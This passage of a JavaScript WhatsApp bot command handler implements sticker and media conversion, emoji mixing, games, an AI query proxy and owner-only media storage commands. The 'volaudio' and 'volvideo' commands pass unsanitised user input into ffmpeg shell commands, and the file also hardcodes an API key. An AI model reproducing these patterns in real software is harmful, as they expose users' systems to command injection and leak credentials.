            {
              quoted: m,
            }
          );
        }
        break;
      //convert
      case "s":
      case "sticker":
      case "stiker":
        {
          if (!quoted)
            return replyLinkGc(
              `Send/Reply Images/Videos/Gifs With Captions ${
                prefix + command
              }\nVideo Duration 1-9 Seconds`
            );
          if (/image/.test(mime)) {
            let media = await quoted.download();
            let encmedia = await OctopusBotzz.sendImageAsSticker(
              m.chat,
              media,
              m,
              { packname: global.packname, author: global.author }
            );
          } else if (/video/.test(mime)) {
            if ((quoted.msg || quoted).seconds > 11)
              return replyLinkGc(
                "Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds"
              );
            let media = await quoted.download();
            let encmedia = await OctopusBotzz.sendVideoAsSticker(
              m.chat,
              media,
              m,
              { packname: global.packname, author: global.author }
            );
          } else {
            replyLinkGc(
              `Send/Reply Images/Videos/Gifs With Captions ${
                prefix + command
              }\nVideo Duration 1-9 Seconds`
            );
          }
        }
        break;
      case "wm":
      case "swm":
      case "steal":
      case "stickerwm":
      case "take":
        {
          if (!isPremium) return replyprem(mess.premium);
          if (!args.join(" ")) return replyLinkGc(`Where is the text?`);
          const swn = args.join(" ");
          const pcknm = swn.split("|")[0];
          const atnm = swn.split("|")[1];
          if (m.quoted.isAnimated === true) {
            OctopusBotzz.downloadAndSaveMediaMessage(quoted, "gifee");
            OctopusBotzz.sendMessage(
              from,
              { sticker: fs.readFileSync("gifee.webp") },
              { quoted: m }
            );
          } else if (/image/.test(mime)) {
            let media = await quoted.download();
            let encmedia = await OctopusBotzz.sendImageAsSticker(
              m.chat,
              media,
              m,
              { packname: pcknm, author: atnm }
            );
          } else if (/video/.test(mime)) {
            if ((quoted.msg || quoted).seconds > 11)
              return replyLinkGc("Maximum 10 Seconds!");
            let media = await quoted.download();
            let encmedia = await OctopusBotzz.sendVideoAsSticker(
              m.chat,
              media,
              m,
              { packname: pcknm, author: atnm }
            );
          } else {
            replyLinkGc(`Photo/Video?`);
          }
        }
        break;
      case "toimage":
      case "toimg":
        {
          if (!/webp/.test(mime))
            return replyLinkGc(
              `Reply sticker with caption *${prefix + command}*`
            );
          await XeonStickWait();
          let media = await OctopusBotzz.downloadAndSaveMediaMessage(qmsg);
          let ran = await getRandom(".png");
          exec(`ffmpeg -i ${media} ${ran}`, (err) => {
            fs.unlinkSync(media);
            if (err) return err;
            let buffer = fs.readFileSync(ran);
            OctopusBotzz.sendMessage(
              m.chat,
              {
                image: buffer,
              },
              {
                quoted: m,
              }
            );
            fs.unlinkSync(ran);
          });
        }
        break;
      case "toimghd":
        {
          if (!/webp/.test(mime))
            return replyLinkGc(
              `Reply sticker with caption *${prefix + command}*`
            );
          await XeonStickWait();
          const { remini } = require("./lib/remini");
          let media = await OctopusBotzz.downloadAndSaveMediaMessage(qmsg);
          let ran = await getRandom(".png");
          exec(`ffmpeg -i ${media} ${ran}`, (err) => {
            fs.unlinkSync(media);
            if (err) return err;
            let buffer = fs.readFileSync(ran);
            let result = remini(media, "enhance");
            OctopusBotzz.sendMessage(
              m.chat,
              { image: result, caption: mess.success },
              { quoted: m }
            );
            fs.unlinkSync(ran);
          });
        }
        break;
      case "tomp4":
      case "tovideo":
        {
          if (!/webp/.test(mime))
            return replyLinkGc(
              `Reply sticker with caption *${prefix + command}*`
            );
          await XeonStickWait();
          let media = await OctopusBotzz.downloadAndSaveMediaMessage(qmsg);
          let webpToMp4 = await webp2mp4File(media);
          await OctopusBotzz.sendMessage(
            m.chat,
            {
              video: {
                url: webpToMp4.result,
                caption: "Convert Webp To Video",
              },
            },
            {
              quoted: m,
            }
          );
          await fs.unlinkSync(media);
        }
        break;
      case "toaud":
      case "toaudio":
        {
          if (!/video/.test(mime) && !/audio/.test(mime))
            return replyLinkGc(
              `Send/Reply Video/Audio that you want to make into audio with captions ${
                prefix + command
              }`
            );
          await XeonStickWait();
          let media = await OctopusBotzz.downloadMediaMessage(qmsg);
          let audio = await toAudio(media, "mp4");
          OctopusBotzz.sendMessage(
            m.chat,
            {
              audio: audio,
              mimetype: "audio/mpeg",
            },
            {
              quoted: m,
            }
          );
        }
        break;
      case "tomp3":
        {
          if (!/video/.test(mime) && !/audio/.test(mime))
            return replyLinkGc(
              `Send/Reply Video/Audio that you want to make into MP3 with captions ${
                prefix + command
              }`
            );
          await XeonStickWait();
          let media = await OctopusBotzz.downloadMediaMessage(qmsg);
          let audio = await toAudio(media, "mp4");
          OctopusBotzz.sendMessage(
            m.chat,
            {
              document: audio,
              mimetype: "audio/mp3",
              fileName: `dgxeon.mp3`,
            },
            {
              quoted: m,
            }
          );
        }
        break;
      case "tovn":
      case "toptt":
        {
          if (!/video/.test(mime) && !/audio/.test(mime))
            return replyLinkGc(
              `Send/Reply Video/Audio that you want to make into a VN with captions ${
                prefix + command
              }`
            );
          await XeonStickWait();
          let media = await OctopusBotzz.downloadMediaMessage(qmsg);
          let { toPTT } = require("./lib/converter");
          let audio = await toPTT(media, "mp4");
          OctopusBotzz.sendMessage(
            m.chat,
            {
              audio: audio,
              mimetype: "audio/mpeg",
              ptt: true,
            },
            {
              quoted: m,
            }
          );
        }
        break;
      case "togif":
        {
          if (!/webp/.test(mime))
            return replyLinkGc(
              `Reply sticker with caption *${prefix + command}*`
            );
          await XeonStickWait();
          let media = await OctopusBotzz.downloadAndSaveMediaMessage(qmsg);
          let webpToMp4 = await webp2mp4File(media);
          await OctopusBotzz.sendMessage(
            m.chat,
            {
              video: {
                url: webpToMp4.result,
                caption: "Convert Webp To Video",
              },
              gifPlayback: true,
            },
            {
              quoted: m,
            }
          );
          await fs.unlinkSync(media);
        }
        break;
      case "tourl":
      case "tolink":
        {
          await XeonStickWait();
          let media = await OctopusBotzz.downloadAndSaveMediaMessage(qmsg);
          if (/image/.test(mime)) {
            let anu = await TelegraPh(media);
            replyLinkGc(util.format(anu));
          } else if (!/image/.test(mime)) {
            let anu = await UploadFileUgu(media);
            replyLinkGc(util.format(anu));
          }
          await fs.unlinkSync(media);
        }
        break;
      case "emojimix":
        {
          let [emoji1, emoji2] = text.split`+`;
          if (!emoji1)
            return replyLinkGc(`Example : ${prefix + command} 😅+🤔`);
          if (!emoji2)
            return replyLinkGc(`Example : ${prefix + command} 😅+🤔`);
          await XeonStickWait();
          let anu = await fetchJson(
            `https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(
              emoji1
            )}_${encodeURIComponent(emoji2)}`
          );
          for (let res of anu.results) {
            let encmedia = await OctopusBotzz.sendImageAsSticker(
              m.chat,
              res.url,
              m,
              {
                packname: global.packname,
                author: global.author,
                categories: res.tags,
              }
            );
          }
        }
        break;
      case "emojimix2":
        {
          if (!text) return replyLinkGc(`Example : ${prefix + command} 😅`);
          let anu = await fetchJson(
            `https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(
              text
            )}`
          );
          for (let res of anu.results) {
            let encmedia = await OctopusBotzz.sendImageAsSticker(
              m.chat,
              res.url,
              m,
              {
                packname: global.packname,
                author: global.author,
                categories: res.tags,
              }
            );
          }
        }
        break;
      case "toonce":
      case "toviewonce":
        {
          if (!quoted) return replyLinkGc(`Reply Image/Video`);
          if (/image/.test(mime)) {
            anuan = await OctopusBotzz.downloadAndSaveMediaMessage(quoted);
            OctopusBotzz.sendMessage(
              m.chat,
              {
                image: {
                  url: anuan,
                },
                caption: mess.done,
                fileLength: "999",
                viewOnce: true,
              },
              {
                quoted: m,
              }
            );
          } else if (/video/.test(mime)) {
            anuanuan = await OctopusBotzz.downloadAndSaveMediaMessage(quoted);
            OctopusBotzz.sendMessage(
              m.chat,
              {
                video: {
                  url: anuanuan,
                },
                caption: mess.done,
                fileLength: "99999999",
                viewOnce: true,
              },
              {
                quoted: m,
              }
            );
          } else if (/audio/.test(mime)) {
            bebasap = await OctopusBotzz.downloadAndSaveMediaMessage(quoted);
            OctopusBotzz.sendMessage(m.chat, {
              audio: {
                url: bebasap,
              },
              mimetype: "audio/mpeg",
              ptt: true,
              viewOnce: true,
            });
          }
        }
        break;
      case "fliptext":
        {
          if (args.length < 1)
            return replyLinkGc(`Example:\n${prefix}fliptext dgxeon`);
          quere = args.join(" ");
          flipe = quere.split("").reverse().join("");
          replyLinkGc(
            `\`\`\`「 FLIP TEXT 」\`\`\`\n*•> Normal :*\n${quere}\n*•> Flip :*\n${flipe}`
          );
        }
        break;
      case "toqr":
        {
          if (!q) return replyLinkGc(" Please include link or text!");
          const QrCode = require("qrcode-reader");
          const qrcode = require("qrcode");
          let qyuer = await qrcode.toDataURL(q, { scale: 35 });
          let data = new Buffer.from(
            qyuer.replace("data:image/png;base64,", ""),
            "base64"
          );
          let buff = getRandom(".jpg");
          await fs.writeFileSync("./" + buff, data);
          let medi = fs.readFileSync("./" + buff);
          await OctopusBotzz.sendMessage(
            from,
            { image: medi, caption: "Here you go!" },
            { quoted: m }
          );
          setTimeout(() => {
            fs.unlinkSync(buff);
          }, 10000);
        }
        break;
      case "volaudio":
        {
          if (!args.join(" "))
            return replyLinkGc(`Example: ${prefix + command} 10`);
          media = await OctopusBotzz.downloadAndSaveMediaMessage(
            quoted,
            "volume"
          );
          rname = getRandom(".mp3");
          exec(
            `ffmpeg -i ${media} -filter:a volume=${args[0]} ${rname}`,
            (err, stderr, stdout) => {
              fs.unlinkSync(media);
              if (err) return replyLinkGc("Error!");
              jadie = fs.readFileSync(rname);
              OctopusBotzz.sendMessage(
                from,
                {
                  audio: jadie,
                  mimetype: "audio/mp4",
                  ptt: true,
                },
                { quoted: m }
              );
              fs.unlinkSync(rname);
            }
          );
        }
        break;
      case "volvideo":
        {
          if (!args.join(" "))
            return replyLinkGc(`Example: ${prefix + command} 10`);
          media = await OctopusBotzz.downloadAndSaveMediaMessage(
            quoted,
            "volume"
          );
          rname = getRandom(".mp4");
          exec(
            `ffmpeg -i ${media} -filter:a volume=${args[0]} ${rname}`,
            (err, stderr, stdout) => {
              fs.unlinkSync(media);
              if (err) return replyLinkGc("Error!");
              jadie = fs.readFileSync(rname);
              OctopusBotzz.sendMessage(
                from,
                { video: jadie, mimetype: "video/mp4" },
                { quoted: m }
              );
              fs.unlinkSync(rname);
            }
          );
        }
        break;
      case "bass":
      case "blown":
      case "deep":
      case "earrape":
      case "fast":
      case "fat":
      case "nightcore":
      case "reverse":
      case "robot":
      case "slow":
      case "smooth":
      case "squirrel":
        try {
          let set;
          if (/bass/.test(command))
            set = "-af equalizer=f=54:width_type=o:width=2:g=20";
          if (/blown/.test(command)) set = "-af acrusher=.1:1:64:0:log";
          if (/deep/.test(command)) set = "-af atempo=4/4,asetrate=44500*2/3";
          if (/earrape/.test(command)) set = "-af volume=12";
          if (/fast/.test(command))
            set = '-filter:a "atempo=1.63,asetrate=44100"';
          if (/fat/.test(command))
            set = '-filter:a "atempo=1.6,asetrate=22100"';
          if (/nightcore/.test(command))
            set = "-filter:a atempo=1.06,asetrate=44100*1.25";
          if (/reverse/.test(command)) set = '-filter_complex "areverse"';
          if (/robot/.test(command))
            set =
              "-filter_complex \"afftfilt=real='hypot(re,im)*sin(0)':imag='hypot(re,im)*cos(0)':win_size=512:overlap=0.75\"";
          if (/slow/.test(command))
            set = '-filter:a "atempo=0.7,asetrate=44100"';
          if (/smooth/.test(command))
            set =
              "-filter:v \"minterpolate='mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120'\"";
          if (/squirrel/.test(command))
            set = '-filter:a "atempo=0.5,asetrate=65100"';
          if (/audio/.test(mime)) {
            await XeonStickWait();
            let media = await OctopusBotzz.downloadAndSaveMediaMessage(quoted);
            let ran = getRandom(".mp3");
            exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
              fs.unlinkSync(media);
              if (err) return replyLinkGc(err);
              let buff = fs.readFileSync(ran);
              OctopusBotzz.sendMessage(
                m.chat,
                { audio: buff, mimetype: "audio/mpeg" },
                { quoted: m }
              );
              fs.unlinkSync(ran);
            });
          } else
            replyLinkGc(
              `Reply to the audio you want to change with a caption *${
                prefix + command
              }*`
            );
        } catch (e) {
          replyLinkGc(e);
        }
        break;
      //game
      case "ttc":
      case "ttt":
      case "tictactoe":
        {
          let TicTacToe = require("./lib/tictactoe");
          this.game = this.game ? this.game : {};
          if (
            Object.values(this.game).find(
              (room) =>
                room.id.startsWith("tictactoe") &&
                [room.game.playerX, room.game.playerO].includes(m.sender)
            )
          )
            return replyLinkGc("You are still in the game");
          let room = Object.values(this.game).find(
            (room) =>
              room.state === "WAITING" && (text ? room.name === text : true)
          );
          if (room) {
            replyLinkGc("Partner not found!");
            room.o = m.chat;
            room.game.playerO = m.sender;
            room.state = "PLAYING";
            let arr = room.game.render().map((v) => {
              return {
                X: "❌",
                O: "⭕",
                1: "1️⃣",
                2: "2️⃣",
                3: "3️⃣",
                4: "4️⃣",
                5: "5️⃣",
                6: "6️⃣",
                7: "7️⃣",
                8: "8️⃣",
                9: "9️⃣",
              }[v];
            });
            let str = `Room ID: ${room.id}

${arr.slice(0, 3).join("")}
${arr.slice(3, 6).join("")}
${arr.slice(6).join("")}

Wait @${room.game.currentTurn.split("@")[0]}

Type *surrender* to give up and admit defeat`;
            if (room.x !== room.o)
              await OctopusBotzz.sendText(room.x, str, m, {
                mentions: parseMention(str),
              });
            await OctopusBotzz.sendText(room.o, str, m, {
              mentions: parseMention(str),
            });
          } else {
            room = {
              id: "tictactoe-" + +new Date(),
              x: m.chat,
              o: "",
              game: new TicTacToe(m.sender, "o"),
              state: "WAITING",
            };
            if (text) room.name = text;
            replyLinkGc(
              "Waiting for partner" +
                (text
                  ? ` type the command below ${prefix}${command} ${text}`
                  : "")
            );
            this.game[room.id] = room;
          }
        }
        break;
      case "delttc":
      case "delttt":
        {
          this.game = this.game ? this.game : {};
          try {
            if (this.game) {
              delete this.game;
              OctopusBotzz.sendText(
                m.chat,
                `Berhasil delete session TicTacToe`,
                m
              );
            } else if (!this.game) {
              replyLinkGc(`Session TicTacToe🎮 tidak ada`);
            } else mewReply("?");
          } catch (e) {
            replyLinkGc("rusak");
          }
        }
        break;
      case "suitpvp":
      case "suit":
        {
          this.suit = this.suit ? this.suit : {};
          let poin = 10;
          let poin_lose = 10;
          let timeout = 60000;
          if (
            Object.values(this.suit).find(
              (roof) =>
                roof.id.startsWith("suit") &&
                [roof.p, roof.p2].includes(m.sender)
            )
          )
            replyLinkGc(`Finish your previous suit`);
          if (m.mentionedJid[0] === m.sender)
            return replyLinkGc(`Can't play with myself !`);
          if (!m.mentionedJid[0])
            return replyLinkGc(
              `_Who do you want to challenge?_\nTag the person..\n\nExample : ${prefix}suit @${owner[1]}`,
              m.chat,
              {
                mentions: [owner[1] + "@s.whatsapp.net"],
              }
            );
          if (
            Object.values(this.suit).find(
              (roof) =>
                roof.id.startsWith("suit") &&
                [roof.p, roof.p2].includes(m.mentionedJid[0])
            )
          )
            return replyLinkGc(
              `The person you are challenging is playing suit with someone else :(`
            );
          let id = "suit_" + new Date() * 1;
          let caption = `_*SUIT PvP*_

@${m.sender.split`@`[0]} challenged @${
            m.mentionedJid[0].split`@`[0]
          } to play suits

Please @${m.mentionedJid[0].split`@`[0]} to type accept/reject`;
          this.suit[id] = {
            chat: await OctopusBotzz.sendText(m.chat, caption, m, {
              mentions: parseMention(caption),
            }),
            id: id,
            p: m.sender,
            p2: m.mentionedJid[0],
            status: "wait",
            waktu: setTimeout(() => {
              if (this.suit[id])
                OctopusBotzz.sendText(m.chat, `_Suit time is up_`, m);
              delete this.suit[id];
            }, 60000),
            poin,
            poin_lose,
            timeout,
          };
        }
        break;
      case "mathquiz":
      case "math":
        {
          if (kuismath.hasOwnProperty(m.sender.split("@")[0]))
            replyLinkGc(`There are still unfinished sessions!`);
          let { genMath, modes } = require("./lib/math");
          if (!text)
            return replyLinkGc(
              `Mode: ${Object.keys(modes).join(
                " | "
              )}\nUsage example: ${prefix}math medium`
            );
          let result = await genMath(text.toLowerCase());
          OctopusBotzz.sendText(
            m.chat,
            `*What is the result of: ${result.soal.toLowerCase()}*?\n\nTime: ${(
              result.waktu / 1000
            ).toFixed(2)} second`,
            m
          ).then(() => {
            kuismath[m.sender.split("@")[0]] = result.jawaban;
          });
          await sleep(result.waktu);
          if (kuismath.hasOwnProperty(m.sender.split("@")[0])) {
            console.log("Answer: " + result.jawaban);
            replyLinkGc(
              "Time has run out\nAnswer: " + kuismath[m.sender.split("@")[0]]
            );
            delete kuismath[m.sender.split("@")[0]];
          }
        }
        break;
      case "afk":
        {
          let user = global.db.data.users[m.sender];
          user.afkTime = +new Date();
          user.afkReason = text;
          replyLinkGc(`${m.pushName} *Has Gone AFK*${text ? ": " + text : ""}`);
        }
        break;
      case "ai":
      case "ask":
      case "openai":
        {
          if (db.data.users[sender].limit < 1) return replyLinkGc(mess.limit);
          if (!q)
            return replyLinkGc(`Example : ${prefix + command} who is ronaldo`);
          var isiai = await fetchJson(`https://aemt.me/openai?text=${q}`);
          var isi = isiai.result;
          await replyLinkGc(isi);
        }
        break;
      case "xxqc":
        {
          if (!q)
            return replyLinkGc(
              `📌Example: ${
                prefix + command
              } pink hallo\n\n꒰ 🖌️ Color List ꒱ ೄྀ࿐ ˊˎ-\n━━━━━━⊱⋆⊰━━━━━━\npink\nblue\nred\ngreen\nyellow\npurple\ndarkblue\nlightblue\nash\norange\nblack\nwhite\nteal\nlightpink\nchocolate\nsalmon\nmagenta\ntan\nwheat\ndeeppink\nfire\nskyblue\nsafron\nbrightskyblue\nhotpink\nlightskyblue\nseagreen\ndarkred\norangered\ncyan\nviolet\nmossgreen\ndarkgreen\nnavyblue\ndarkorange\ndarkpurple\nfuchsia\ndarkmagenta\ndarkgray\npeachpuff\nblackishgreen\ndarkishred\ngoldenrod\ndarkishgray\ndarkishpurple\ngold\nsilver`
            );
          if (text.length > 100) return replyLinkGc(`Max 100 character.`);
          let [color, ...message] = text.split(" ");
          message = message.join(" ");
          let backgroundColor;
          switch (color) {
            case "pink":
              backgroundColor = "#f68ac9";
              break;
            case "blue":
              backgroundColor = "#6cace4";
              break;
            case "red":
              backgroundColor = "#f44336";
              break;
            case "green":
              backgroundColor = "#4caf50";
              break;
            case "yellow":
              backgroundColor = "#ffeb3b";
              break;
            case "purple":
              backgroundColor = "#9c27b0";
              break;
            case "darkblue":
              backgroundColor = "#0d47a1";
              break;
            case "lightblue":
              backgroundColor = "#03a9f4";
              break;
            case "ash":
              backgroundColor = "#9e9e9e";
              break;
            case "orange":
              backgroundColor = "#ff9800";
              break;
            case "black":
              backgroundColor = "#000000";
              break;
            case "white":
              backgroundColor = "#ffffff";
              break;
            case "teal":
              backgroundColor = "#008080";
              break;
            case "lightpink":
              backgroundColor = "#FFC0CB";
              break;
            case "chocolate":
              backgroundColor = "#A52A2A";
            case "salmon":
              backgroundColor = "#FFA07A";
              break;
            case "magenta":
              backgroundColor = "#FF00FF";
              break;
            case "tan":
              backgroundColor = "#D2B48C";
              break;
            case "wheat":
              backgroundColor = "#F5DEB3";
              break;
            case "deeppink":
              backgroundColor = "#FF1493";
              break;
            case "fire":
              backgroundColor = "#B22222";
              break;
            case "skyblue":
              backgroundColor = "#00BFFF";
              break;
            case "orange":
              backgroundColor = "#FF7F50";
              break;
            case "brightskyblue":
              backgroundColor = "#1E90FF";
              break;
            case "hotpink":
              backgroundColor = "#FF69B4";
              break;
            case "lightskyblue":
              backgroundColor = "#87CEEB";
              break;
            case "seagreen":
              backgroundColor = "#20B2AA";
              break;
            case "darkred":
              backgroundColor = "#8B0000";
              break;
            case "orangered":
              backgroundColor = "#FF4500";
              break;
            case "cyan":
              backgroundColor = "#48D1CC";
              break;
            case "violet":
              backgroundColor = "#BA55D3";
              break;
            case "mossgreen":
              backgroundColor = "#00FF7F";
              break;
            case "darkgreen":
              backgroundColor = "#008000";
              break;
            case "navyblue":
              backgroundColor = "#191970";
              break;
            case "darkorange":
              backgroundColor = "#FF8C00";
              break;
            case "darkpurple":
              backgroundColor = "#9400D3";
              break;
            case "fuchsia":
              backgroundColor = "#FF00FF";
              break;
            case "darkmagenta":
              backgroundColor = "#8B008B";
              break;
            case "darkgray":
              backgroundColor = "#2F4F4F";
              break;
            case "peachpuff":
              backgroundColor = "#FFDAB9";
              break;
            case "darkishgreen":
              backgroundColor = "#BDB76B";
              break;
            case "darkishred":
              backgroundColor = "#DC143C";
              break;
            case "goldenrod":
              backgroundColor = "#DAA520";
              break;
            case "darkishgray":
              backgroundColor = "#696969";
              break;
            case "darkishpurple":
              backgroundColor = "#483D8B";
              break;
            case "gold":
              backgroundColor = "#FFD700";
              break;
            case "silver":
              backgroundColor = "#C0C0C0";
              break;
            default:
              return replyLinkGc("The selected color is not available.");
          }
          let obj = {
            type: "quote",
            format: "png",
            backgroundColor,
            width: 512,
            height: 768,
            scale: 2,
            messages: [
              {
                entities: [],
                avatar: true,
                from: {
                  id: 1,
                  name: pushname,
                  photo: {
                    url: await OctopusBotzz.profilePictureUrl(
                      m.sender,
                      "image"
                    ).catch(
                      () =>
                        "https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60"
                    ),
                  },
                },
                text: message,
                replyMessage: {},
              },
            ],
          };
          let response = await axios.post(
            "https://bot.lyo.su/quote/generate",
            obj,
            {
              headers: {
                "Content-Type": "application/json",
              },
            }
          );
          let buffer = Buffer.from(response.data.result.image, "base64");
          OctopusBotzz.sendImageAsSticker(m.chat, buffer, m, {
            packname: `${global.packname}`,
            author: `${global.author}`,
          });
        }
        break;
      case "ephemeral":
        {
          if (!m.isGroup) return XeonStickGroup();
          if (!isBotAdmins) return XeonStickBotAdmin();
          if (!isAdmins) return XeonStickAdmin();
          if (!text) return replyLinkGc("Enter the value enable/disable");
          if (args[0] === "on") {
            await OctopusBotzz.sendMessage(m.chat, {
              disappearingMessagesInChat: WA_DEFAULT_EPHEMERAL,
            });
            await replyLinkGc(`Done`);
          } else if (args[0] === "off") {
            await OctopusBotzz.sendMessage(m.chat, {
              disappearingMessagesInChat: false,
            });
            await replyLinkGc(`Done`);
          }
        }
        break;
      case "delete":
      case "del":
      case "d":
        {
          let key = {};
          try {
            key.remoteJid = m.quoted
              ? m.quoted.fakeObj.key.remoteJid
              : m.key.remoteJid;
            key.fromMe = m.quoted ? m.quoted.fakeObj.key.fromMe : m.key.fromMe;
            key.id = m.quoted ? m.quoted.fakeObj.key.id : m.key.id;
            key.participant = m.quoted
              ? m.quoted.fakeObj.participant
              : m.key.participant;
          } catch (e) {
            console.error(e);
          }
          OctopusBotzz.sendMessage(m.chat, { delete: key });
        }
        break;
      case "autoswview":
      case "autostatusview":
        {
          if (!isCreator) return XeonStickOwner();
          if (args.length < 1) return replyLinkGc("on/off?");
          if (args[0] === "on") {
            antiswview = true;
            replyLinkGc(`${command} is enabled`);
          } else if (args[0] === "off") {
            antiswview = false;
            replyLinkGc(`${command} is disabled`);
          }
        }
        break;
      case "anticall":
        {
          if (!isCreator) return XeonStickOwner();
          if (args.length < 1) return replyLinkGc("on/off?");
          if (args[0] === "on") {
            anticall = true;
            replyLinkGc(`${command} is enabled`);
          } else if (args[0] === "off") {
            anticall = false;
            replyLinkGc(`${command} is disabled`);
          }
        }
        break;
        break;
      case "addvideo":
        {
          if (!isCreator) return XeonStickOwner();
          if (args.length < 1) return replyLinkGc("Whats the video name?");
          if (VideoXeon.includes(q))
            return replyLinkGc("The name is already in use");
          let delb = await OctopusBotzz.downloadAndSaveMediaMessage(quoted);
          VideoXeon.push(q);
          await fsx.copy(delb, `./OctopusBotzzMedia/video/${q}.mp4`);
          fs.writeFileSync(
            "./OctopusBotzzMedia/database/xeonvideo.json",
            JSON.stringify(VideoXeon)
          );
          fs.unlinkSync(delb);
          replyLinkGc(
            `Success Adding Video\nCheck by typing ${prefix}listvideo`
          );
        }
        break;
      case "delvideo":
        {
          if (!isCreator) return XeonStickOwner();
          if (args.length < 1) return replyLinkGc("Enter the video name");
          if (!VideoXeon.includes(q))
            return replyLinkGc("The name does not exist in the database");
          let wanu = VideoXeon.indexOf(q);
          VideoXeon.splice(wanu, 1);
          fs.writeFileSync(
            "./OctopusBotzzMedia/database/xeonvideo.json",
            JSON.stringify(VideoXeon)
          );
          fs.unlinkSync(`./OctopusBotzzMedia/video/${q}.mp4`);
          replyLinkGc(`Success deleting video ${q}`);
        }
        break;
      case "listvideo":
        {
          let teks = "┌──⭓「 *Video List* 」\n│\n";
          for (let x of VideoXeon) {
            teks += `│⭔ ${x}\n`;
          }
          teks += `│\n└────────────⭓\n\n*Totally there are : ${VideoXeon.length}*`;
          replyLinkGc(teks);
        }
        break;
      case "addimage":
        {
          if (!isCreator) return XeonStickOwner();
          if (args.length < 1) return replyLinkGc("Whats the image name?");
          if (ImageXeon.includes(q))
            return replyLinkGc("The name is already in use");
          let delb = await OctopusBotzz.downloadAndSaveMediaMessage(quoted);
          ImageXeon.push(q);
          await fsx.copy(delb, `./OctopusBotzzMedia/image/${q}.jpg`);
          fs.writeFileSync(
            "./OctopusBotzzMedia/database/xeonimage.json",
            JSON.stringify(ImageXeon)
          );
          fs.unlinkSync(delb);
          replyLinkGc(
            `Success Adding Image\nCheck by typing ${prefix}listimage`
          );
        }
        break;
      case "delimage":
        {
          if (!isCreator) return XeonStickOwner();
          if (args.length < 1) return replyLinkGc("Enter the image name");
          if (!ImageXeon.includes(q))
            return replyLinkGc("The name does not exist in the database");
          let wanu = ImageXeon.indexOf(q);
          ImageXeon.splice(wanu, 1);
          fs.writeFileSync(
            "./OctopusBotzzMedia/database/xeonimage.json",
            JSON.stringify(ImageXeon)
          );
          fs.unlinkSync(`./OctopusBotzzMedia/image/${q}.jpg`);
          replyLinkGc(`Success deleting image ${q}`);
        }
        break;
      case "listimage":
        {
          let teks = "┌──⭓「 *Image List* 」\n│\n";
          for (let x of ImageXeon) {
            teks += `│⭔ ${x}\n`;
          }
          teks += `│\n└────────────⭓\n\n*Totally there are : ${ImageXeon.length}*`;
          replyLinkGc(teks);
        }
        break;
      case "addsticker":
        {
          if (!isCreator) return XeonStickOwner();
          if (args.length < 1) return replyLinkGc("Whats the sticker name?");
          if (StickerXeon.includes(q))
            return replyLinkGc("The name is already in use");
          let delb = await OctopusBotzz.downloadAndSaveMediaMessage(quoted);
          StickerXeon.push(q);
          await fsx.copy(delb, `./OctopusBotzzMedia/sticker/${q}.webp`);
          fs.writeFileSync(
            "./OctopusBotzzMedia/database/xeonsticker.json",
            JSON.stringify(StickerXeon)
          );
          fs.unlinkSync(delb);
          replyLinkGc(
            `Success Adding Sticker\nCheck by typing ${prefix}liststicker`
          );
        }
        break;
      case "delsticker":
        {
          if (!isCreator) return XeonStickOwner();
          if (args.length < 1) return replyLinkGc("Enter the sticker name");
          if (!StickerXeon.includes(q))
            return replyLinkGc("The name does not exist in the database");
          let wanu = StickerXeon.indexOf(q);
          StickerXeon.splice(wanu, 1);
          fs.writeFileSync(
            "./OctopusBotzzMedia/database/xeonsticker.json",
            JSON.stringify(StickerXeon)
          );
          fs.unlinkSync(`./OctopusBotzzMedia/sticker/${q}.webp`);
          replyLinkGc(`Success deleting sticker ${q}`);
        }
        break;
      case "liststicker":
        {
          let teks = "┌──⭓「 *Sticker List* 」\n│\n";
          for (let x of StickerXeon) {
            teks += `│⭔ ${x}\n`;
          }
          teks += `│\n└────────────⭓\n\n*Totally there are : ${StickerXeon.length}*`;
          replyLinkGc(teks);
        }
        break;
      case "addmsg":
        {
          if (!isCreator) return XeonStickOwner();
          if (!m.quoted)
            return replyLinkGc("Reply Message You Want To Save In Database");
          if (!text)
            return replyLinkGc(`Example : ${prefix + command} filename`);
          let msgs = global.db.data.database;
          if (text.toLowerCase() in msgs)
            return replyLinkGc(`'${text}' registered in the message list`);
          msgs[text.toLowerCase()] = quoted.fakeObj;
          replyLinkGc(`Successfully added message in message list as '${text}'
    
Access with ${prefix}getmsg ${text}

View list of Messages With ${prefix}listmsg`);
        }
        break;
      case "getmsg":
        {
          if (!text)
            return replyLinkGc(
              `Example : ${
                prefix + command
              } file name\n\nView list of messages with ${prefix}listmsg`
            );
          let msgs = global.db.data.database;
          if (!(text.toLowerCase() in msgs))
            return replyLinkGc(`'${text}' not listed in the message list`);
          OctopusBotzz.copyNForward(m.chat, msgs[text.toLowerCase()], true);
        }
        break;
      case "listmsg":
        {
          let msgs = JSON.parse(fs.readFileSync("./assets/database.json"));
          let seplit = Object.entries(global.db.data.database).map(
            ([nama, isi]) => {
              return { nama, ...isi };
            }
          );
          let teks = " DATABASE LIST \n\n";
          for (let i of seplit) {
            teks += `${themeemoji} *Name :* ${
              i.nama
            }\n${themeemoji} *Type :* ${getContentType(i.message).replace(
              /Message/i,
              ""
            )}\n────────────────────────\n\n`;
          }
          replyLinkGc(teks);
        }
        break;
      case "delmsg":
      case "deletemsg":
        {
          if (!isCreator) return XeonStickOwner();
          let msgs = global.db.data.database;
          if (!(text.toLowerCase() in msgs))
            return replyLinkGc(`'${text}' not listed in the message list`);
          delete msgs[text.toLowerCase()];
          replyLinkGc(`Successfully deleted '${text}' from the message list`);
        }
        break;
      case "addvn":
        {
          if (!isCreator) return XeonStickOwner();
          if (args.length < 1) return replyLinkGc("Whats the audio name?");
          if (VoiceNoteXeon.includes(q))
            return replyLinkGc("The name is already in use");
          let delb = await OctopusBotzz.downloadAndSaveMediaMessage(quoted);
          VoiceNoteXeon.push(q);
          await fsx.copy(delb, `./OctopusBotzzMedia/audio/${q}.mp3`);
          fs.writeFileSync(
